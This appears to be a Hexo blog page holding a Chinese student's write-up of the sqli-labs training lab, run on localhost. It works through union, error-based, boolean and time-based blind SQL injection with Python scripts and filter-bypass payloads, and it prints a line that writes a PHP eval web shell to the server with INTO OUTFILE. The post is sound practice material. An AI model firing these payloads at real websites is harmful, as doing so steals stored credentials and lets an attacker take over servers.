@@ -1,0 +1,690 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="判断封闭过滤-&gt;搜集信息（数据库名、表名、字段名等）-&gt;注入部署在localhost:8081 Page 1Less 1依标题这是get型，没有过滤（用#会直接报错）尝试下?id&#x3D;1&#39;，报错，再用?id&#x3D;1&#39;--+，字符型输入?id&#x3D;1&#39; order by 3--+正常显示，改为4报错，判断有3列获得数据库信息：?id&#x3D;-1&#39; union select">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023&#x2F;07&#x2F;16：夏令营week1记录:sql-lab">
+<meta property="og:url" content="http://example.com/2023/07/16/sql-lab/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="判断封闭过滤-&gt;搜集信息（数据库名、表名、字段名等）-&gt;注入部署在localhost:8081 Page 1Less 1依标题这是get型，没有过滤（用#会直接报错）尝试下?id&#x3D;1&#39;，报错，再用?id&#x3D;1&#39;--+，字符型输入?id&#x3D;1&#39; order by 3--+正常显示，改为4报错，判断有3列获得数据库信息：?id&#x3D;-1&#39; union select">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-07-16T06:20:17.000Z">
+<meta property="article:modified_time" content="2023-08-31T14:19:07.879Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>2023/07/16：夏令营week1记录:sql-lab - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023/07/16：夏令营week1记录:sql-lab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-16 14:20" pubdate>
+          July 16, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          62 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2023/07/16：夏令营week1记录:sql-lab</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>判断封闭过滤-&gt;搜集信息（数据库名、表名、字段名等）-&gt;注入<br>部署在localhost:8081</p>
+<h2 id="Page-1"><a href="#Page-1" class="headerlink" title="Page 1"></a>Page 1</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less 1"></a>Less 1</h3><p>依标题这是get型，没有过滤（用#会直接报错）<br>尝试下<code>?id=1&#39;</code>，报错，再用<code>?id=1&#39;--+</code>，字符型<br>输入<code>?id=1&#39; order by 3--+</code>正常显示，改为4报错，判断有3列<br>获得数据库信息：<code>?id=-1&#39; union select 1,database(),3--+</code>结果为security<br>表：<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</code>结果为users<br>字段：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code>由题目，选择username和password<br>结果：<code>?id=-1&#39; union select 1,2,group_concat(username,id,password) from users --+</code></p>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less 2"></a>Less 2</h3><p>跟上一题差不多，不过数字型去掉单引号即可</p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less 3"></a>Less 3</h3><p>输入?id=1’时报错信息中有括号，在单引号后补个括号后剩下步骤与Less 1差不多</p>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less 4"></a>Less 4</h3><p>输入?id=1’正常，输入?id=1”报错且报错信息中有括号，与Less 1类似</p>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less 5"></a>Less 5</h3><p>题目说明本题双注<br>单引号闭合<br>方法一：双注<br>双注： 当查询语句的前面出现聚合函数 就是多个返回结果count()就是多行的意思 后面的查询结果代码会以错误的形式显示出来<br>原理：<br>count等聚合函数之后，如果使用分组语句，就会把查询的一部分以错误的形式显示出来<br>可能使用到的语句：<br>rand():遵循四舍五入把原值转化为指定小数位数，当不指定时，返回一个介于 0 到 1（不包括 0 和 1）之间的伪随机 float 值<br>floor:向下舍入为指定小数位数<br>ceiling:向上舍入为指定小数位数<br>注入语句：<br><code>select count(*) from [table] group by concat(&#39;~&#39;,([真正的查询语句]),&#39;~&#39;，floor(rand(0)*2))</code><br>或<br><code>select count(*),concat_ws(char(32,58,32),([查询语句]),floor(rand(0)*2)) as a from [table] group by a</code><br>使用floor(rand()*2)返回结果只有0和1，当为0时报错<br>获得数据库信息：<code>?id=-1&#39; union all select count(*),2,concat( &#39;~&#39;,(select schema_name from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a %23</code><br>获得表：<code>?id=-1&#39; union all select count(*),2,concat( &#39;~&#39;,(select table_name from information_schema.tables where table_schema = &#39;security&#39; limit 3,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a %23</code><br>获得字段：<code>?id=-1&#39; union all select count(*),1,concat( &#39;~&#39;,(select column_name from information_schema.columns where table_name= &#39;users&#39; limit 2,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a %23</code><br>结果：<code>?id=-1&#39; union all select count(*),1,concat( &#39;~&#39;,(select concat(id,username,password) from users limit 2,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a %23</code><br>方法二：盲注<br>本题无回显也可以考虑盲注<br>由于有报错回显，可使用布尔盲注</p>
+<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less 6"></a>Less 6</h3><p>双引号闭合，剩下步骤与上相同<br>使用sqlmap：<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://localhost:8081/Less-6/?id=1&quot;">http://localhost:8081/Less-6/?id=1&quot;</a> –current-db<br>返回：security</p>
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less 7"></a>Less 7</h3><p>导出文件型<br>使用outfile 写入到服务器，可以利用这个漏洞写入一句话马<br>需要验证几个条件：<br>1.获取文件的可读<br><code>1&#39;)) and (select count(*) from mysql.user)&gt;0 %23</code><br>2.注入文件<br><code>id=-1&#39;)) union select 1,2,3 into outfile &quot;绝对地址&quot; %23</code><br>3.<code>id=-1&#39;)) union select 1,&quot;&lt;?php @eval($_POST[&#39;giantbranch&#39;]);?&gt;&quot; into outfile &quot;XXX\test.php&quot; %23</code><br>但尝试后出不来</p>
+<p>可以让sqlmap执行相同工作（</p>
+<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h4><p>布尔型盲注<br>找了个脚本</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs csharp">import requests<br><br>success_url = <span class="hljs-string">&quot;http://localhost:8081/Less-8/?id=1&quot;</span><br>success_response_len = len(requests.<span class="hljs-keyword">get</span>(success_url).text)<br><br><span class="hljs-function">def <span class="hljs-title">get_DBName_len</span>():</span><br><span class="hljs-function">    DBName_len</span> = <span class="hljs-number">0</span><br>    url_template = success_url + <span class="hljs-string">&quot;&#x27; and (length(database())=&#123;0&#125;) %2D%2D%20&quot;</span><br>    <span class="hljs-function"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title">range</span>(<span class="hljs-params"><span class="hljs-number">1</span>,<span class="hljs-number">20</span></span>):</span><br><span class="hljs-function">        url</span> = url_template.format(i)<br>        response = requests.<span class="hljs-keyword">get</span>(url)<br>        <span class="hljs-function"><span class="hljs-keyword">if</span> <span class="hljs-title">len</span>(<span class="hljs-params">response.text</span>)</span> == success_response_len:<br>            DBName_len = <span class="hljs-function">i</span><br><span class="hljs-function">            <span class="hljs-title">print</span>(<span class="hljs-params"><span class="hljs-string">&quot;DBName_len is:&quot;</span>,DBName_len</span>)</span><br><span class="hljs-function">            <span class="hljs-keyword">break</span></span><br><span class="hljs-function">    <span class="hljs-keyword">return</span> DBName_len</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">get_DBName_len</span>()</span><br></code></pre></td></tr></table></figure>
+<h3 id="Less-9-amp-10"><a href="#Less-9-amp-10" class="headerlink" title="Less 9 &amp; 10"></a>Less 9 &amp; 10</h3><p>均为时间盲注<br>引号闭合不同</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">length</span>(database())=<span class="hljs-number">8</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+<h3 id="Less-11-14"><a href="#Less-11-14" class="headerlink" title="Less 11 - 14"></a>Less 11 - 14</h3><p>与 1-4 类似，但改为POST型</p>
+<h3 id="Less-15-amp-16"><a href="#Less-15-amp-16" class="headerlink" title="Less 15 &amp; 16"></a>Less 15 &amp; 16</h3><p>post时间盲注，引号闭合不同</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> <span class="hljs-type">time</span> <span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br>url = &quot;http://192.168.64.135/Less-15/&quot;<br><span class="hljs-type">char</span> = &quot;abcdefghijklmnopqrstuvwxyz_&quot;<br>print(&quot;start!&quot;)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">database</span> = &quot;&quot;<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):<br>        <span class="hljs-keyword">for</span> str <span class="hljs-keyword">in</span> <span class="hljs-type">char</span>:<br><br>            time1 = <span class="hljs-type">time</span>()<br>            data = &#123;<span class="hljs-string">&#x27;uname&#x27;</span>:&quot;admin&#x27;and if((mid((select schema_name from information_schema.schemata limit %d,1),%d,1))=&#x27;%s&#x27;,sleep(0.1),1)#&quot;%(i,j,str),<span class="hljs-string">&#x27;passwd&#x27;</span>:&quot;1&quot;&#125;<br>            res = requests.post(url,data=data)<br>            //使用mid截断判断<br>            time2 = <span class="hljs-type">time</span>()<br><br>            <span class="hljs-keyword">if</span> (time2-time1 &gt; <span class="hljs-number">0.1</span> ):<br>                <span class="hljs-keyword">database</span> += str<br>                #print(<span class="hljs-keyword">database</span>)<br>                break<br>    print(&quot;the %d database: &quot;% (i+<span class="hljs-number">1</span>))<br>    print(<span class="hljs-keyword">database</span>)<br>print(&quot;end!&quot;)<br></code></pre></td></tr></table></figure>
+<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less 17"></a>Less 17</h3><p>根据提示为密码更新，尝试后发现有报错信息<br>报错注入：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27; and updatexml(1, concat(0x7e,database(),0x7e),1) # 数据库</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) # 数据表<br><span class="hljs-string">&#x27; and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 3,1),0x7e),1)# 字段</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">7</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) # 数据<br></code></pre></td></tr></table></figure>
+<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less 18"></a>Less 18</h3><p>先对ip尝试注入，无效<br>用admin/admin登录，发现存在回显显示了User Agent<br>测试闭合，存在报错信息</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27; or updatexml(1, concat(0x7e,database(),0x7e),1) or &#x27;</span> <span class="hljs-regexp">//</span>获得数据库<br>余下与上相似<br></code></pre></td></tr></table></figure>
+<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less 19"></a>Less 19</h3><p>用admin/admin登录，存在回显Referer<br>测试闭合，存在报错信息<br>与18同，但是换了个位置</p>
+<h3 id="Less-20（写不出来，修改cookie就收不到请求包）"><a href="#Less-20（写不出来，修改cookie就收不到请求包）" class="headerlink" title="Less 20（写不出来，修改cookie就收不到请求包）"></a>Less 20（写不出来，修改cookie就收不到请求包）</h3><p>针对cookie头部注入<br>（跑不出来）<br>cookie中的uname补单引号会出现报错信息，可以进行报错注入<br>也可直接使用联合注入语句</p>
+<h2 id="Page-2"><a href="#Page-2" class="headerlink" title="Page 2"></a>Page 2</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less 21"></a>Less 21</h3><p>仍然是在cookie注入，但是经过base64编码，将注入语句编码即可<br>该题为<code>&#39;)</code>闭合</p>
+<h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less 22"></a>Less 22</h3><p>与21区别闭合改为双引号</p>
+<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less 23"></a>Less 23</h3><p>过滤了注释，无法用<code>#</code>和<code>--</code></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1 &#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>() <span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
+<h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less 24"></a>Less 24</h3><p>二次注入：对二次调用函数没有进行过滤，导致用户可以通过构造payload绕过去修改其他用户的密码<br>先注册账号<code>admin &#39; #</code>并登录，然后对密码进行修改<br>登录admin，使用刚刚修改的密码发现登录成功</p>
+<h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less 25"></a>Less 25</h3><p>过滤or和and<br>查看源码，黑名单将这两个关键字替换为空格，可以使用双写绕过<br>可使用报错注入，直接联合注入也有回显</p>
+<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less 25a"></a>Less 25a</h3><p>25的升级变为盲注<br>联合注入+时间盲注脚本</p>
+<h3 id="Less-26-amp-26a"><a href="#Less-26-amp-26a" class="headerlink" title="Less 26 &amp; 26a"></a>Less 26 &amp; 26a</h3><p>过滤注释和空格<br>也可以直接使用报错注入<br>关于过滤：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">绕过空格：<span class="hljs-variable">%09</span> tab键 <span class="hljs-variable">%0</span>a 新建一行 <span class="hljs-variable">%0</span><span class="hljs-keyword">c</span> 新的一页 <span class="hljs-variable">%od</span> return功能 <span class="hljs-variable">%0</span>b tab键垂直 <span class="hljs-variable">%a0</span> 空格<br>绕过<span class="hljs-keyword">and</span>：&amp;&amp;<br>绕过<span class="hljs-keyword">or</span>：||<br>绕过注释：注释，分号闭合，冒号<span class="hljs-variable">%00</span>截断<br></code></pre></td></tr></table></figure>
+<p>联合注入：</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">?id=&#x27;<span class="hljs-built_in">%a</span>0union<span class="hljs-built_in">%a</span>0select<span class="hljs-built_in">%a</span>01,<span class="hljs-number">2</span>,database()<span class="hljs-built_in">%a</span>0&#x27;<br></code></pre></td></tr></table></figure>
+<p>报错注入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br></code></pre></td></tr></table></figure>
+<p>26a升级盲注，但使用联合注入<code>union select 1,2,3</code>仍有回显</p>
+<h3 id="Less-27-amp-27a"><a href="#Less-27-amp-27a" class="headerlink" title="Less 27 &amp; 27a"></a>Less 27 &amp; 27a</h3><p>过滤union和select两个关键字及注释空格<br>可以使用大小写绕过</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span>&#x27;<span class="hljs-variable">%0</span>aUnIoN<span class="hljs-variable">%0</span>aSeleCt<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-comment">;%00</span><br></code></pre></td></tr></table></figure>
+<h3 id="Less-28-amp-28a"><a href="#Less-28-amp-28a" class="headerlink" title="Less 28 &amp; 28a"></a>Less 28 &amp; 28a</h3><p>在27的基础上增加大小写的过滤<br><code>?id=&#39;)%A0UnIoN%A0SeLeCt%A01,3,4%26%26%a0(&#39;1</code></p>
+<h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less 29"></a>Less 29</h3><p>看wp需要利用HPP漏洞<br>HPP是“ HTTP Parameter Pollution ”的缩写，即“ HTTP 参数污染 ”，<br>通常在一个请求中，同样名称的参数只会出现一次，但是在 HTTP 协议中是允许同样名称的参数出现多次的。<br>在这里选择注入<code>?id=1&amp;id=0</code>，第一个参数进入WAF（jsp服务器，在这题起到防火墙的作用），第二个参数则直接输出，在第二个参数中注入即可</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less 30"></a>Less 30</h3><p>同样方法，改双引号</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less 31"></a>Less 31</h3><p>同样方式</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">0</span><span class="hljs-string">&quot;)%20union%20select%201,2,database()%20--+</span><br></code></pre></td></tr></table></figure>
+<h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less 32"></a>Less 32</h3><p>会对特殊字符添加转义字符\（如addslashes()函数）<br>这里需要宽字节注入，利用数据库编码与前端编码不一致</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%df</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span> <span class="hljs-variable">%23</span><br></code></pre></td></tr></table></figure>
+<p>这里<code>%df</code>超过两个字节，单引号逃逸</p>
